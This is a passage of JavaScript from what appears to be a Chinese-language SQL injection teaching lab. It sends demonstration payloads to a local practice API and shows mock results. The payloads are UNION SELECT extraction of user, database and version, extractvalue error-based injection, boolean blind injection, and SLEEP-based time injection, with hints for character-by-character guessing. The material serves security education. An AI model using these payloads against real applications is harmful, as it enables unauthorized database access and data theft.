            resultSql.innerHTML = '<code>执行SQL: ' + sqlHtml + '</code>';

            if (isQuote) {
                // 输入 ' → SQL语法错误
                resultBadge.innerHTML = '<span class="vf-bool-badge-false"><i class="fa fa-times-circle"></i> 输入单引号 → SQL报错</span>';
                resultBox.className = 'vf-bool-result vf-bool-result-false';

                var errorHtml = '<div class="vf-mock-browser">';
                errorHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?name=' + encodeURIComponent(input) + '</div>';
                errorHtml += '<div class="vf-mock-browser-body">';
                errorHtml += '<div class="vf-mock-error-page">';
                errorHtml += '<div class="vf-mock-error-title"><i class="fa fa-exclamation-circle"></i> SQL Syntax Error</div>';
                errorHtml += '<div class="vf-mock-error-code">1064 - You have an error in your SQL syntax</div>';
                errorHtml += '<div class="vf-mock-error-detail">' + (data.error ? SQLDebug.escapeHtml(data.error.substring(0, 120)) : 'SQL语法错误') + '</div>';
                errorHtml += '</div></div></div>';
                resultBody.innerHTML = errorHtml;
                resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 输入单引号后页面<strong>报错</strong>，说明用户输入影响了SQL语句结构 → 存在字符型注入点';
            } else {
                // 输入 '-- → 查询成功（注释掉了后面的引号）
                resultBadge.innerHTML = '<span class="vf-bool-badge-false"><i class="fa fa-check-circle"></i> 输入 \'-- → 正常响应</span>';
                resultBox.className = 'vf-bool-result vf-bool-result-false';

                var normalHtml = '<div class="vf-mock-browser">';
                normalHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?name=' + encodeURIComponent(input) + '</div>';
                normalHtml += '<div class="vf-mock-browser-body">';
                normalHtml += '<div class="vf-mock-empty-page"><i class="fa fa-inbox"></i><p>暂无商品信息</p></div>';
                normalHtml += '</div></div>';
                resultBody.innerHTML = normalHtml;
                resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 添加注释符 <code>\'--</code> 后页面<strong>恢复正常</strong>（不再报错），说明注入的引号被注释闭合 → 确认存在字符型注入';
            }
        })
        .catch(function(err) {
            resultBody.innerHTML = '<div class="error-message"><i class="fa fa-exclamation-triangle"></i> 请求失败</div>';
        });
}

/**
 * 回显注入演示：测试 UNION SELECT 联合查询
 * 通过UNION将额外查询结果（数据库信息）拼接到页面回显中
 * @param {string} type - 'union' 执行UNION联合查询
 */
function testEchoInject(type) {
    var btnUnion = document.getElementById('btnEchoUnion');
    var resultBox = document.getElementById('echoResultBox');
    var resultBadge = document.getElementById('echoResultBadge');
    var resultSql = document.getElementById('echoResultSql');
    var resultBody = document.getElementById('echoResultBody');
    var resultFooter = document.getElementById('echoResultFooter');

    // 互斥：隐藏其他注入方式的结果
    document.getElementById('errorResultBox').classList.add('vf-hidden');
    document.getElementById('blindResultBox').classList.add('vf-hidden');
    document.getElementById('timeBlindResultBox').classList.add('vf-hidden');
    document.getElementById('btnErrorExtract').classList.remove('active');
    document.getElementById('btnBlindTrue').classList.remove('active');
    document.getElementById('btnBlindFalse').classList.remove('active');
    document.getElementById('btnTimeShort').classList.remove('active');
    document.getElementById('btnTimeLong').classList.remove('active');

    // 切换按钮状态
    btnUnion.classList.add('active');

    // 显示结果区
    resultBox.classList.remove('vf-hidden');

    // 显示加载
    resultBadge.textContent = '';
    resultSql.textContent = '';
    resultBody.innerHTML = '<div class="loading"><i class="fa fa-spinner fa-spin"></i> 正在查询...</div>';
    resultFooter.textContent = '';

    // UNION注入payload
    var input = '1 UNION SELECT 1,user(),database(),version()';

    // 调用API查询
    var queryInput = input.replace(/--\+/g, '-- ');
    fetch('api/practice-query.php?scenario=numeric&input=' + encodeURIComponent(queryInput))
        .then(function(response) { return response.json(); })
        .then(function(data) {
            var rows = data.data || [];
            var count = rows.length;
            var safeInput = SQLDebug.escapeHtml(input);

            // SQL语句展示（高亮注入部分）
            var sqlHtml = data.sql ? SQLDebug.escapeHtml(data.sql) : '';
            sqlHtml = sqlHtml.replace(/\n/g, '<br>');
            // 高亮UNION部分
            var unionPart = 'UNION SELECT 1,user(),database(),version()';
            var unionEscaped = SQLDebug.escapeHtml(unionPart);
            if (sqlHtml.indexOf(unionEscaped) !== -1) {
                sqlHtml = sqlHtml.replace(unionEscaped, '<strong class="vf-text-danger">' + unionEscaped + '</strong>');
            }
            resultSql.innerHTML = '<code>执行SQL: ' + sqlHtml + '</code>';

            // 标记
            resultBadge.innerHTML = '<span class="vf-bool-badge-false"><i class="fa fa-exclamation-triangle"></i> UNION联合查询 → 回显' + count + '行数据</span>';
            resultBox.className = 'vf-bool-result vf-bool-result-false';

            // 商品名到图片的映射
            var productImages = {
                'Apple': 'images/apple.svg',
                'Banana': 'images/banana.svg',
                'Orange': 'images/orange.svg',
                'Grape': 'images/grape.svg',
                'Watermelon': 'images/watermelon.svg'
            };

            // 模拟浏览器窗口展示回显页面
            // UNION注入：只显示一张商品卡片，注入数据直接替换原商品字段
            var injectRow = null;
            for (var i = 0; i < rows.length; i++) {
                var name = rows[i].name || '';
                if (!productImages[name]) {
                    injectRow = rows[i];
                    break;
                }
            }

            var displayName = injectRow ? (injectRow.name || '') : '';
            var displayPrice = injectRow ? (injectRow.price || '') : '';
            var displayDesc = injectRow ? (injectRow.description || '') : '';

            var pageHtml = '<div class="vf-mock-browser">';
            pageHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?id=1+UNION+SELECT+1,user(),database(),version()</div>';
            pageHtml += '<div class="vf-mock-browser-body">';
            pageHtml += '<div class="vf-mock-product-card vf-mock-leak-card">';
            pageHtml += '<div class="vf-mock-product-img"><i class="fa fa-database"></i></div>';
            pageHtml += '<div class="vf-mock-product-info">';
            pageHtml += '<div class="vf-mock-product-name">' + SQLDebug.escapeHtml(displayName) + '</div>';
            pageHtml += '<div class="vf-mock-product-price">$' + SQLDebug.escapeHtml(displayPrice) + '</div>';
            pageHtml += '<div class="vf-mock-product-desc">' + SQLDebug.escapeHtml(displayDesc) + '</div>';
            pageHtml += '<div class="vf-mock-product-btn">加入购物车</div>';
            pageHtml += '</div></div>';
            pageHtml += '</div></div>';
            resultBody.innerHTML = pageHtml;
            resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 回显注入：UNION将<strong>数据库信息</strong>（用户名、数据库名、版本）直接拼接到页面展示中 → 攻击者无需猜测，一目了然';
        })
        .catch(function(err) {
            resultBody.innerHTML = '<div class="error-message"><i class="fa fa-exclamation-triangle"></i> 请求失败</div>';
        });
}

/**
 * 报错注入演示：通过extractvalue函数触发XPATH错误，在错误信息中泄露数据库信息
 * @param {string} type - 'extractvalue' 使用extractvalue报错注入
 */
function testErrorInject(type) {
    var btnExtract = document.getElementById('btnErrorExtract');
    var resultBox = document.getElementById('errorResultBox');
    var resultBadge = document.getElementById('errorResultBadge');
    var resultSql = document.getElementById('errorResultSql');
    var resultBody = document.getElementById('errorResultBody');
    var resultFooter = document.getElementById('errorResultFooter');

    // 互斥：隐藏其他注入方式的结果
    document.getElementById('echoResultBox').classList.add('vf-hidden');
    document.getElementById('blindResultBox').classList.add('vf-hidden');
    document.getElementById('timeBlindResultBox').classList.add('vf-hidden');
    document.getElementById('btnEchoUnion').classList.remove('active');
    document.getElementById('btnBlindTrue').classList.remove('active');
    document.getElementById('btnBlindFalse').classList.remove('active');
    document.getElementById('btnTimeShort').classList.remove('active');
    document.getElementById('btnTimeLong').classList.remove('active');

    // 切换按钮状态
    btnExtract.classList.add('active');

    // 显示结果区
    resultBox.classList.remove('vf-hidden');

    // 显示加载
    resultBadge.textContent = '';
    resultSql.textContent = '';
    resultBody.innerHTML = '<div class="loading"><i class="fa fa-spinner fa-spin"></i> 正在查询...</div>';
    resultFooter.textContent = '';

    // 报错注入payload（字符型场景）
    var input = "' AND extractvalue(1,concat(0x7e,database()))-- ";

    // 调用API查询（使用single_quote场景）
    var queryInput = input.replace(/--\+/g, '-- ');
    fetch('api/practice-query.php?scenario=single_quote&input=' + encodeURIComponent(queryInput))
        .then(function(response) { return response.json(); })
        .then(function(data) {
            // SQL语句展示（高亮注入部分）
            var sqlHtml = data.sql ? SQLDebug.escapeHtml(data.sql) : '';
            sqlHtml = sqlHtml.replace(/\n/g, '<br>');
            // 高亮extractvalue部分
            var injectPart = "extractvalue(1,concat(0x7e,database()))";
            var injectEscaped = SQLDebug.escapeHtml(injectPart);
            if (sqlHtml.indexOf(injectEscaped) !== -1) {
                sqlHtml = sqlHtml.replace(injectEscaped, '<strong class="vf-text-danger">' + injectEscaped + '</strong>');
            }
            resultSql.innerHTML = '<code>执行SQL: ' + sqlHtml + '</code>';

            resultBadge.innerHTML = '<span class="vf-bool-badge-false"><i class="fa fa-bug"></i> 报错注入 → 错误信息泄露数据</span>';
            resultBox.className = 'vf-bool-result vf-bool-result-false';

            // 从错误信息中提取泄露的数据库名
            var errorMsg = data.error || 'XPATH syntax error';
            var leakedData = '';
            // 尝试从错误信息中提取 ~xxx 格式的数据
            var tildeMatch = errorMsg.match(/~([^~\s']+)/);
            if (tildeMatch) {
                leakedData = tildeMatch[1];
            }

            // 模拟浏览器窗口展示错误页面
            var errorHtml = '<div class="vf-mock-browser">';
            errorHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?name=' + encodeURIComponent(input) + '</div>';
            errorHtml += '<div class="vf-mock-browser-body">';
            errorHtml += '<div class="vf-mock-error-page">';
            errorHtml += '<div class="vf-mock-error-title"><i class="fa fa-exclamation-circle"></i> SQL Error</div>';
            errorHtml += '<div class="vf-mock-error-code">1105 - XPATH syntax error</div>';
            errorHtml += '<div class="vf-mock-error-detail">' + SQLDebug.escapeHtml(errorMsg.substring(0, 200)) + '</div>';
            if (leakedData) {
                errorHtml += '<div class="vf-mock-leak-highlight">';
                errorHtml += '<i class="fa fa-unlock"></i> 从错误信息中提取的数据: <strong class="vf-text-danger">' + SQLDebug.escapeHtml(leakedData) + '</strong>';
                errorHtml += '</div>';
            }
            errorHtml += '</div></div></div>';
            resultBody.innerHTML = errorHtml;
            resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 报错注入：利用数据库函数的<strong>错误信息</strong>携带敏感数据 → 无需页面回显位置，只需错误信息可被用户看到';
        })
        .catch(function(err) {
            resultBody.innerHTML = '<div class="error-message"><i class="fa fa-exclamation-triangle"></i> 请求失败</div>';
        });
}

/**
 * 盲注演示：通过布尔条件判断逐字符提取数据
 * 与上方布尔盲注类似，但强调"盲注"的适用场景
 * @param {string} input - '1 AND 1=1' 或 '1 AND 1=2'
 */
function testBlindInject(input) {
    var btnTrue = document.getElementById('btnBlindTrue');
    var btnFalse = document.getElementById('btnBlindFalse');
    var resultBox = document.getElementById('blindResultBox');
    var resultBadge = document.getElementById('blindResultBadge');
    var resultSql = document.getElementById('blindResultSql');
    var resultBody = document.getElementById('blindResultBody');
    var resultFooter = document.getElementById('blindResultFooter');

    // 互斥：隐藏其他注入方式的结果
    document.getElementById('echoResultBox').classList.add('vf-hidden');
    document.getElementById('errorResultBox').classList.add('vf-hidden');
    document.getElementById('timeBlindResultBox').classList.add('vf-hidden');
    document.getElementById('btnEchoUnion').classList.remove('active');
    document.getElementById('btnErrorExtract').classList.remove('active');
    document.getElementById('btnTimeShort').classList.remove('active');
    document.getElementById('btnTimeLong').classList.remove('active');

    // 切换按钮状态
    var isTrue = (input === '1 AND 1=1');
    btnTrue.classList.toggle('active', isTrue);
    btnFalse.classList.toggle('active', !isTrue);

    // 显示结果区
    resultBox.classList.remove('vf-hidden');

    // 显示加载
    resultBadge.textContent = '';
    resultSql.textContent = '';
    resultBody.innerHTML = '<div class="loading"><i class="fa fa-spinner fa-spin"></i> 正在查询...</div>';
    resultFooter.textContent = '';

    // 调用API查询
    var queryInput = input.replace(/--\+/g, '-- ');
    fetch('api/practice-query.php?scenario=numeric&input=' + encodeURIComponent(queryInput))
        .then(function(response) { return response.json(); })
        .then(function(data) {
            var rows = data.data || [];
            var count = rows.length;
            var safeInput = SQLDebug.escapeHtml(input);

            // SQL语句展示（高亮注入部分）
            var sqlHtml = data.sql ? SQLDebug.escapeHtml(data.sql) : '';
            sqlHtml = sqlHtml.replace(/\n/g, '<br>');
            var hlClass = 'vf-text-danger';
            var safeInputEscaped = SQLDebug.escapeHtml(input);
            if (sqlHtml.indexOf(safeInputEscaped) !== -1) {
                sqlHtml = sqlHtml.replace(safeInputEscaped, '<strong class="' + hlClass + '">' + safeInputEscaped + '</strong>');
            }
            resultSql.innerHTML = '<code>执行SQL: ' + sqlHtml + '</code>';

            // 商品名到图片的映射
            var productImages = {
                'Apple': 'images/apple.svg',
                'Banana': 'images/banana.svg',
                'Orange': 'images/orange.svg',
                'Grape': 'images/grape.svg',
                'Watermelon': 'images/watermelon.svg'
            };

            if (isTrue) {
                // AND 1=1 → 条件为真，有数据
                resultBadge.innerHTML = '<span class="vf-bool-badge-false"><i class="fa fa-check-circle"></i> AND 1=1 → 条件为真，有数据</span>';
                resultBox.className = 'vf-bool-result vf-bool-result-false';

                var pageHtml = '<div class="vf-mock-browser">';
                pageHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?id=1+AND+1=1</div>';
                pageHtml += '<div class="vf-mock-browser-body">';
                if (rows.length > 0) {
                    rows.forEach(function(row) {
                        var imgSrc = productImages[row.name] || '';
                        var imgHtml = imgSrc
                            ? '<img src="' + imgSrc + '" alt="' + SQLDebug.escapeHtml(row.name) + '">'
                            : '<i class="fa fa-image"></i><span>' + SQLDebug.escapeHtml(row.name) + '</span>';
                        pageHtml += '<div class="vf-mock-product-card">';
                        pageHtml += '<div class="vf-mock-product-img">' + imgHtml + '</div>';
                        pageHtml += '<div class="vf-mock-product-info">';
                        pageHtml += '<div class="vf-mock-product-name">' + SQLDebug.escapeHtml(row.name) + '</div>';
                        pageHtml += '<div class="vf-mock-product-price">$' + SQLDebug.escapeHtml(row.price) + '</div>';
                        pageHtml += '<div class="vf-mock-product-desc">' + SQLDebug.escapeHtml(row.description) + '</div>';
                        pageHtml += '<div class="vf-mock-product-btn">加入购物车</div>';
                        pageHtml += '</div></div>';
                    });
                } else {
                    pageHtml += '<div class="vf-mock-empty-page"><i class="fa fa-inbox"></i><p>暂无商品信息</p></div>';
                }
                pageHtml += '</div></div>';
                resultBody.innerHTML = pageHtml;
                resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 盲注：页面<strong>没有直接回显数据</strong>，但通过判断"有数据/无数据"的差异 → 攻击者可逐字符猜解数据库内容';
            } else {
                // AND 1=2 → 条件为假，无数据
                resultBadge.innerHTML = '<span class="vf-bool-badge-false"><i class="fa fa-times-circle"></i> AND 1=2 → 条件为假，无数据</span>';
                resultBox.className = 'vf-bool-result vf-bool-result-false';

                var emptyHtml = '<div class="vf-mock-browser">';
                emptyHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?id=1+AND+1=2</div>';
                emptyHtml += '<div class="vf-mock-browser-body">';
                emptyHtml += '<div class="vf-mock-empty-page"><i class="fa fa-inbox"></i><p>暂无商品信息</p></div>';
                emptyHtml += '</div></div>';
                resultBody.innerHTML = emptyHtml;
                resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 盲注：与上面对比，响应不同 → 攻击者可利用这种差异，构造 <code>AND SUBSTRING(database(),1,1)=\'h\'</code> 逐字符猜解';
            }
        })
        .catch(function(err) {
            resultBody.innerHTML = '<div class="error-message"><i class="fa fa-exclamation-triangle"></i> 请求失败</div>';
        });
}

/**
 * 时间盲注演示：通过SLEEP函数造成的响应时间差异来判断注入条件
 * @param {string} type - 'short' SLEEP(2)短延迟 | 'long' SLEEP(10)长延迟
 */
function testTimeBlindInject(type) {
    var btnShort = document.getElementById('btnTimeShort');
    var btnLong = document.getElementById('btnTimeLong');
    var resultBox = document.getElementById('timeBlindResultBox');
    var resultBadge = document.getElementById('timeBlindResultBadge');
    var resultSql = document.getElementById('timeBlindResultSql');
    var resultBody = document.getElementById('timeBlindResultBody');
    var resultFooter = document.getElementById('timeBlindResultFooter');

    var isShort = (type === 'short');
    var sleepSeconds = isShort ? 2 : 10;

    // 切换按钮状态
    btnShort.classList.toggle('active', isShort);
    btnLong.classList.toggle('active', !isShort);

    // 互斥：隐藏其他注入方式的结果
    document.getElementById('echoResultBox').classList.add('vf-hidden');
    document.getElementById('errorResultBox').classList.add('vf-hidden');
    document.getElementById('blindResultBox').classList.add('vf-hidden');
    document.getElementById('btnEchoUnion').classList.remove('active');
    document.getElementById('btnErrorExtract').classList.remove('active');
    document.getElementById('btnBlindTrue').classList.remove('active');
    document.getElementById('btnBlindFalse').classList.remove('active');

    // 显示结果区
    resultBox.classList.remove('vf-hidden');

    // 确定输入值
    var input = '1 AND SLEEP(' + sleepSeconds + ')';

    // 显示加载
    resultBadge.textContent = '';
    resultSql.textContent = '';
    resultBody.innerHTML = '<div class="loading"><i class="fa fa-spinner fa-spin"></i> 正在查询，请耐心等待...</div>';
    resultFooter.textContent = '';

    // 调用API查询，记录请求时间
    var startTime = Date.now();
    var queryInput = input.replace(/--\+/g, '-- ');
    fetch('api/practice-query.php?scenario=numeric&input=' + encodeURIComponent(queryInput))
        .then(function(response) { return response.json(); })
        .then(function(data) {
            var endTime = Date.now();
            var elapsed = ((endTime - startTime) / 1000).toFixed(2);

            // SQL语句展示（高亮SLEEP部分）
            var sqlHtml = data.sql ? SQLDebug.escapeHtml(data.sql) : '';
            sqlHtml = sqlHtml.replace(/\n/g, '<br>');
            var sleepPart = 'SLEEP(' + sleepSeconds + ')';
            var sleepEscaped = SQLDebug.escapeHtml(sleepPart);
            if (sqlHtml.indexOf(sleepEscaped) !== -1) {
                sqlHtml = sqlHtml.replace(sleepEscaped, '<strong class="vf-text-danger">' + sleepEscaped + '</strong>');
            }
            resultSql.innerHTML = '<code>执行SQL: ' + sqlHtml + '</code>';

            // 根据延迟程度判断
            var elapsedNum = parseFloat(elapsed);
            var timerClass, timerIcon, badgeHtml;
            if (isShort) {
                timerClass = 'vf-timer-warn';
                timerIcon = 'fa-clock';
                badgeHtml = '<span class="vf-bool-badge-false"><i class="fa fa-clock"></i> SLEEP(' + sleepSeconds + ') → 延迟约' + elapsed + '秒</span>';
                resultBox.className = 'vf-bool-result vf-bool-result-false';
            } else {
                timerClass = 'vf-timer-danger';
                timerIcon = 'fa-clock';
                badgeHtml = '<span class="vf-bool-badge-false"><i class="fa fa-clock"></i> SLEEP(' + sleepSeconds + ') → 延迟约' + elapsed + '秒</span>';
                resultBox.className = 'vf-bool-result vf-bool-result-false';
            }
            resultBadge.innerHTML = badgeHtml;

            // 模拟浏览器展示（返回空数据）
            var pageHtml = '<div class="vf-mock-browser">';
            pageHtml += '<div class="vf-mock-browser-bar"><i class="fa fa-globe"></i> product.php?id=' + encodeURIComponent(input) + '</div>';
            pageHtml += '<div class="vf-mock-browser-body">';
            pageHtml += '<div class="vf-mock-empty-page"><i class="fa fa-inbox"></i><p>暂无商品信息</p></div>';
            pageHtml += '</div></div>';
            // 响应时间展示
            pageHtml += '<div class="vf-timer-display ' + timerClass + '">';
            pageHtml += '<i class="fa ' + timerIcon + '"></i> 响应耗时: <strong>' + elapsed + ' 秒</strong>';
            pageHtml += ' <span class="vf-timer-label">（SLEEP(' + sleepSeconds + ')被执行，数据库等待' + sleepSeconds + '秒后返回）</span>';
            pageHtml += '</div>';
            resultBody.innerHTML = pageHtml;

            resultFooter.innerHTML = '<i class="fa fa-lightbulb-o"></i> 时间盲注：页面<strong>无回显、无错误</strong>，但通过响应时间差异 → 攻击者可构造 <code>IF(条件,SLEEP(10),0)</code> 逐字符猜解，延迟越长判断越可靠';
        })
        .catch(function(err) {
            var endTime = Date.now();
            var elapsed = ((endTime - startTime) / 1000).toFixed(2);
            resultBody.innerHTML = '<div class="error-message"><i class="fa fa-exclamation-triangle"></i> 请求失败（耗时: ' + elapsed + '秒）</div>';
        });
}

/**
 * 页面加载完成后初始化
 */
document.addEventListener('DOMContentLoaded', function() {
    // 绑定SQL调试表单
    const debugForm = document.getElementById('sqlDebugForm');
    if (debugForm) {
        debugForm.addEventListener('submit', function(e) {
            e.preventDefault();
            SQLDebug.executeQuery();
        });
    }

    // 绑定练习表单
    const practiceForm = document.getElementById('sqlPracticeForm');
    if (practiceForm) {
        practiceForm.addEventListener('submit', function(e) {
            e.preventDefault();
            SQLPractice.executeTest();
        });
    }

    // 绑定场景切换按钮
    document.querySelectorAll('.scenario-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            SQLPractice.switchScenario(this.dataset.scenario);
        });
    });

    // 初始化数据提取流程显示（默认数字型）
    SQLPractice.updateExtractionSteps('numeric');
});
